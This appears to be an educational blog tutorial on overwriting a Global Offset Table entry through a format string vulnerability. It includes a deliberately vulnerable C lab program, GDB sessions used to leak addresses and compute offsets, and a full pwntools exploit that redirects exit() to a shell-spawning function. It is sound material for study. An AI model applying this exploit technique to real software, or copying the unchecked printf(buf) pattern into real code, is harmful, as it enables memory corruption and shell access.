---
layout: post
title: "GOT Overwrite Using Format Strings"
date: 2021-1-3
---

The Global Offset Table (GOT) is a table of memory addresses, and the location of the GOT is always known at runtime. Typically, the GOT is used to store the address of various functions in libraries that are loaded into the program. Because of PIE, libraries will be relocated at runtime, so the only way for a running process to know the location of a certain library function is by looking it up inside of the GOT.

The Procedure Linkage Table (PLT) contains entries for every external library function in the program. The PLT entry for a function contains some executable code that essentially looks up the address of the function inside of the GOT and jumps to that address. If this is the first time that the function has been called, then the GOT entry will simply point to some code that will figure out the real address of the function. The second time that the function gets called, the GOT entry should point to the real address of the function. This can be summed up in the following steps:
1. The program wants to call some function `x()`, which is located in an external library.
2. The program first jumps to `x@plt`, which is the PLT entry for `x()`.
3. The code at `x@plt` jumps to the function pointer stored at the GOT entry for `x()`. The GOT entry for `x()` is written as `x@got.plt`.
4. If this is the first time that `x()` has been called:
    * `x@got.plt` will simply jump to the line of code that comes right after `x@plt`.
    * The code that comes right after `x@plt` will call a function that will figure out the actual address of `x()`.
    * After the address is found, `x@got.plt` will be replaced with a pointer to the address of `x()`.

Below is an example of how this looks like in assembly. This example was copied straight from a program opened up in GDB, and it is paused right before it makes a call to the `exit()` function.
```
0x5655628d <main+153>       call   0x56556060 <exit@plt>
   ↳  0x56556060 <exit@plt+0>     jmp    DWORD PTR [ebx+0x18]
      0x56556066 <exit@plt+6>     push   0x18
      0x5655606b <exit@plt+11>    jmp    0x56556020
```
In this example, `RIP` is currently pointing to `0x5655628d`. The function wants to call `exit()`, and in order to do this, the function will make a jump to `exit@plt`, which is `0x56556060` in this example. `ebx+0x18` currently points to `x@got.plt`, so the code at `exit@plt+0` will dereference the function pointer at `x@got.plt` and jump to it.

The first time that `exit()` is called, `x@got.plt` will be equal to `exit@plt+6`. In order to dynamically resolve the address of `exit()`, the code will jump to `0x56556020`, which contains code that will figure out the correct address of `exit()`. Technically, `exit()` can only be called once because it stops the program, but if it was possible to call `exit()` a second time, then the jump at `exit@plt+0` would directly jump to the address of `exit()` because it would have already resolved the address beforehand.

If an attacker is able to modify the GOT entry for some function `x()`, the attacker can replace the function pointer at `x@got.plt` with a pointer to some malicious code. After the attacker has hijacked the GOT entry, the attacker's malicious code will be executed instead of `x()` whenever the process calls `x()`. This happens because the process will always lookup the function pointer for `x()` using `x@got.plt` even if the GOT entry has been modified.

Relocation Read-Only (RELRO) is an exploit mitigation technology that marks some sections of a binary as read-only. Nearly all executables have partial RELRO enabled, which will cause the GOT to come before the BSS section in memory. This mitigates against buffer overflows on GOT entries, but it still makes it possible to modify the GOT entry if the attacker can write to arbitrary memory. Full RELRO will make the program resolve all symbols at startup, and afterwards, it marks the GOT as read-only. As a result, full RELRO completely mitigates against all GOT overwrite vulnerabilities. However, full RELRO is not used as often in programs because it delays a program's startup time.

The below program contains a format string vulnerability. In normal circumstances, an attacker could use the format string vulnerability to overwrite the return value and jump to the `win()` function. However, in this example, the program calls `exit()` before it stops, and this means that even if an attacker overwrites the return value, the program will stop before it executes the `ret` instruction at the end of the function. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Compilation: gcc -o got -m32 got.c

void win() {
    system("/bin/sh");
}

int main(int argc, char **argv) {
    char buf[50];
    while(strncmp(buf, "quit\n", 6) != 0 && strncmp(buf, "q\n", 3) != 0) {
        fgets(buf, 50, stdin);
        printf(buf);
    }
    exit(0);
}
```

Instead of overwriting the return address, the attacker could overwrite the GOT entry for `exit()` using a format string vulnerability. If the GOT entry for `exit()` gets overwritten with the address of `win()`, then whenever `exit()` gets called, the program would jump to the `win()` function instead, giving the attacker a shell.

Here is what the main function looks like in assembly:
```
gef➤  disas main
Dump of assembler code for function main:
   0x565561f4 <+0>:     lea    ecx,[esp+0x4]
   0x565561f8 <+4>:     and    esp,0xfffffff0
   0x565561fb <+7>:     push   DWORD PTR [ecx-0x4]
   0x565561fe <+10>:    push   ebp
   0x565561ff <+11>:    mov    ebp,esp
   0x56556201 <+13>:    push   edi
   0x56556202 <+14>:    push   esi
   0x56556203 <+15>:    push   ebx
   0x56556204 <+16>:    push   ecx
   0x56556205 <+17>:    sub    esp,0x48
   0x56556208 <+20>:    call   0x565560d0 <__x86.get_pc_thunk.bx>
   0x5655620d <+25>:    add    ebx,0x2df3
   0x56556213 <+31>:    jmp    0x5655623e <main+74>
   0x56556215 <+33>:    mov    eax,DWORD PTR [ebx-0xc]
   0x5655621b <+39>:    mov    eax,DWORD PTR [eax]
   0x5655621d <+41>:    sub    esp,0x4
   0x56556220 <+44>:    push   eax
   0x56556221 <+45>:    push   0x32
   0x56556223 <+47>:    lea    eax,[ebp-0x4a]
   0x56556226 <+50>:    push   eax
   0x56556227 <+51>:    call   0x56556040 <fgets@plt>
   0x5655622c <+56>:    add    esp,0x10
   0x5655622f <+59>:    sub    esp,0xc
   0x56556232 <+62>:    lea    eax,[ebp-0x4a]
   0x56556235 <+65>:    push   eax
   0x56556236 <+66>:    call   0x56556030 <printf@plt>
   0x5655623b <+71>:    add    esp,0x10
   0x5655623e <+74>:    lea    eax,[ebp-0x4a]
   0x56556241 <+77>:    mov    edx,eax
   0x56556243 <+79>:    lea    eax,[ebx-0x1ff0]
   0x56556249 <+85>:    mov    ecx,0x6
   0x5655624e <+90>:    mov    esi,edx
   0x56556250 <+92>:    mov    edi,eax
   0x56556252 <+94>:    repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x56556254 <+96>:    seta   al
   0x56556257 <+99>:    setb   dl
   0x5655625a <+102>:   sub    eax,edx
   0x5655625c <+104>:   movsx  eax,al
   0x5655625f <+107>:   test   eax,eax
   0x56556261 <+109>:   je     0x56556288 <main+148>
   0x56556263 <+111>:   lea    eax,[ebp-0x4a]
   0x56556266 <+114>:   mov    edx,eax
   0x56556268 <+116>:   lea    eax,[ebx-0x1fea]
   0x5655626e <+122>:   mov    ecx,0x3
   0x56556273 <+127>:   mov    esi,edx
   0x56556275 <+129>:   mov    edi,eax
   0x56556277 <+131>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x56556279 <+133>:   seta   al
   0x5655627c <+136>:   setb   dl
   0x5655627f <+139>:   sub    eax,edx
   0x56556281 <+141>:   movsx  eax,al
   0x56556284 <+144>:   test   eax,eax
   0x56556286 <+146>:   jne    0x56556215 <main+33>
   0x56556288 <+148>:   sub    esp,0xc
   0x5655628b <+151>:   push   0x0
=> 0x5655628d <+153>:   call   0x56556060 <exit@plt>
End of assembler dump.
```

To do this attack, an attacker needs to first leak an address off of the stack and calculate the address of the GOT entry from the leaked address. To find the address of the GOT entry, set a breakpoint at `main+153`, right before the jump to `exit@plt` so that the value of the GOT entry can be recorded right before exiting. Next, continue execution and leak a few pointers off of the stack, then type "quit" to stop.

```
gef➤  c
Continuing.
%p.%p.%p.%p.%p.%p.%p.%p.
0x32.0xf7fb1580.0x5655620d.0x56555034.(nil).0xf7ffd000.0x70250000.0x2e70252e.
quit
quit

Breakpoint 5, 0x5655628d in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0
$ebx   : 0x56559000  →  0x00003ef8
$ecx   : 0x0
$edx   : 0xffffd100  →  0x00000001
$esp   : 0xffffd170  →  0x00000000
$ebp   : 0xffffd1d8  →  0x00000000
$esi   : 0xffffd194  →  "%p.%p.%p.%p.%p.%p.\n"
$edi   : 0x56557016  →  0x00000a71 ("q\n"?)
$eip   : 0x5655628d  →  <main+153> call 0x56556060 <exit@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd170│+0x0000: 0x00000000   ← $esp
0xffffd174│+0x0004: 0x00000032 ("2"?)
0xffffd178│+0x0008: 0xf7fb1580  →  0xfbad2288
0xffffd17c│+0x000c: 0x5655620d  →  <main+25> add ebx, 0x2df3
0xffffd180│+0x0010: 0x56555034  →  0x00000006
0xffffd184│+0x0014: 0x00000000
0xffffd188│+0x0018: 0xf7ffd000  →  0x00029f3c
0xffffd18c│+0x001c: 0x75710000
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x56556280 <main+140>       ror    BYTE PTR [edi], 1
   0x56556282 <main+142>       mov    esi, 0x75c085c0
   0x56556287 <main+147>       lea    eax, [ebx+0x6a0cec]
 → 0x5655628d <main+153>       call   0x56556060 <exit@plt>
   ↳  0x56556060 <exit@plt+0>     jmp    DWORD PTR [ebx+0x18]
      0x56556066 <exit@plt+6>     push   0x18
      0x5655606b <exit@plt+11>    jmp    0x56556020
      0x56556070 <__libc_start_main@plt+0> jmp    DWORD PTR [ebx+0x1c]
      0x56556076 <__libc_start_main@plt+6> push   0x20
      0x5655607b <__libc_start_main@plt+11> jmp    0x56556020
──────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
exit@plt (
   [sp + 0x0] = 0x00000000
)
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "got", stopped 0x5655628d in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5655628d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

The GOT entry is clearly at `ebx+0x18` because that is where the first `jmp` instruction jumps to inside of `exit@plt`. Printing this out gives an address of `0x56559018`. Note that ASLR is enabled, so the address may change in another instance of the process.
```
gef➤  x/2w $ebx+0x18
0x56559018 <exit@got.plt>:      0x56556066      0xf7dead40
```

The third value that was leaked off of the stack was `0x5655620d`, which seems close to the address of `exit@got.plt`. The difference between the third address leaked off of the stack and the address of `exit@got.plt` can be found using python.
```
$ python3
Python 3.8.6 (default, Sep 25 2020, 09:36:53)
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x5655620d - 0x56559018)
'-0x2e0b'
```

This means that adding `0x2e0b` to the third address leaked off of the stack will give the attacker the address of `exit@got.plt`. The attacker can use the same trick to calculate the address of `win()` using this leaked value.

```
gef➤  disas win
Dump of assembler code for function win:
   0x565561c9 <+0>:     push   ebp
   0x565561ca <+1>:     mov    ebp,esp
   0x565561cc <+3>:     push   ebx
   0x565561cd <+4>:     sub    esp,0x4
   0x565561d0 <+7>:     call   0x56556292 <__x86.get_pc_thunk.ax>
   0x565561d5 <+12>:    add    eax,0x2e2b
   0x565561da <+17>:    sub    esp,0xc
   0x565561dd <+20>:    lea    edx,[eax-0x1ff8]
   0x565561e3 <+26>:    push   edx
   0x565561e4 <+27>:    mov    ebx,eax
   0x565561e6 <+29>:    call   0x56556050 <system@plt>
   0x565561eb <+34>:    add    esp,0x10
   0x565561ee <+37>:    nop
   0x565561ef <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x565561f2 <+41>:    leave
   0x565561f3 <+42>:    ret
End of assembler dump.
```

The `win()` function is located at `0x565561c9`, and python can again be used to find the offset of this address from the leaked address.
```
$ python3
Python 3.8.6 (default, Sep 25 2020, 09:36:53)
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x5655620d - 0x565561c9)
'0x44'
```
This means that subtracting `0x44` from the third address leaked off of the stack will give the attacker the address of `win()`.

One thing to note is that the attacker has complete control over the eighth address on the stack. In the below example, the attacker modifies the eighth value on the stack to be B's. Note that the eighth value on the stack is being used instead of the seventh value because the attack can only control two bytes of the seventh value on the stack.
```
$ ./got                                                                                                  127 ⨯
AABBBB%8$p
AABBBB0x42424242
```

If the attacker modifies the input to be `AABBBB%8$n`, the attacker can write an arbitrary number to the memory address `0x42424242`. The attacker can write to arbitrary memory by replacing the B's with a real memory address. In this exploit, the attacker will replace the B's with the calculated GOT address, and the attacker will write two bytes at a time (meaning that the attacker needs to use the format string vulnerability twice to write out the entire four-byte pointer to `win()` in the GOT entry).

The form for the input that will modify the GOT address for the vulnerable program is `AA<memory address>%<number>p%8$n`. Some arbitrary number of spaces are printed out using `%<number>p` in order to control the output of `%n`. Since `<memory address>` should be the eighth value on the stack, doing `%8$n` will replace the value at `<memory address>` with `<number>+6`.

This input will be used twice: Once to write out the low-end bytes of the address of `win()` to the low-end bytes of `exit@got.plt`, and another time to write out the high-end bytes of the address of `win()` to the high-end bytes of `exit@got.plt`. Below is the entire exploit written out in Python. The value of `<number>` will be either the low-end bytes of the address of `win()` or the high-end bytes of the address of `win()`, and it will be in base 10 since `printf()` requires a base 10 integer for the format string to work.

Since `<memory address>` is four bytes, and there are another two bytes of A's in the beginning, the program will print six bytes before it reaches `%<number>p`. This means that six should be subtracted from number in order to have the exact address be printed out.

```python
#!/usr/bin/env python3
from pwn import *

# Create a new process
p = process("./got")

# Calculate the address of the GOT entry for exit()
p.sendline("%3$p")
leaked_addr = int(p.recvline(), 16)
exit_got_addr_low = p32(leaked_addr + 0x2e0b)
exit_got_addr_high = p32(leaked_addr + 0x2e0d)

# Find the address of win()
win_addr = leaked_addr - 0x44

# Convert the jump address into two base 10 integers
win_addr_low = 0x0000ffff & win_addr
win_addr_high = (0xffff0000 & win_addr) >> 16
win_addr_low -= 6
win_addr_high -= 6
win_addr_low = str(win_addr_low).encode('ascii')
win_addr_high = str(win_addr_high).encode('ascii')

# Trigger the GOT overflow
p.sendline(b"AA" + exit_got_addr_low + b"%" + win_addr_low + b"p" + b"%8$n")
p.recvline()
p.sendline(b"AA" + exit_got_addr_high + b"%" + win_addr_high + b"p" + b"%8$n")
p.recvline()
p.sendline("quit")
p.recvline()
p.interactive()
```

Extra resources:
1. https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of
2. https://cs155.stanford.edu/papers/formatstring-1.2.pdf
3. https://www.ret2rop.com/2018/10/format-strings-got-overwrite-remote.html
4. https://ctf101.org/binary-exploitation/relocation-read-only/

{% include related_posts.html %}
